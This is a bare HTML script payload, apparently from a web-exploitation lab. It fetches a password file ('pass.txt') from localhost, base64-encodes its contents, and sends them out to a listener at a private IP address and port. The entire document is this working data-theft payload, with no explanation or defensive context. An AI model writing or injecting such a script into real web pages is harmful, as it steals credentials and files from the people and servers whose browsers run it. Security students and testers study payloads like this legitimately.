<script>
fetch("http://127.0.0.1/dir/pass.txt")
  .then((response) => response.text())
  .then(data => {
    var encoded = btoa(data);
    fetch("http://192.168.130.144:8888?c=" + encodeURIComponent(encoded));
  })
  
</script>